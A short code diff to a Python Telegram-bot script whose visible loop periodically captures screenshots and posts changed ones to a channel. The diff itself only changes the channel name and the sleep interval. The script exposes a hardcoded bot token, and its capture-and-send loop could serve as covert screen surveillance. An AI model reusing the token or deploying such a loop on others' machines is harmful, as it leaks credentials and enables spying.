@@ -8,8 +8,7 @@ import io
 TOKEN = '7042651707:AAFeKArSV9cufcmZD0ZXygha_9g6ZV6pV84'
 
 # Channel ID where you want to send screenshots
-CHANNEL_ID = '@foreardtester'
-
+CHANNEL_ID = '@forwardtestert'
 # Initialize the bot
 bot = telebot.TeleBot(TOKEN)
 
@@ -41,7 +40,7 @@ def main():
                  screenshot.save(screenshot_bytes, format='PNG')
                  if screenshot_bytes.getvalue() != photo_re.read():
                     send_screenshot(screenshot)
-            time.sleep(3)  # Adjust the time interval as needed
+            time.sleep(2)  # Adjust the time interval as needed
 
 # Entry point of the script
 if __name__ == '__main__':
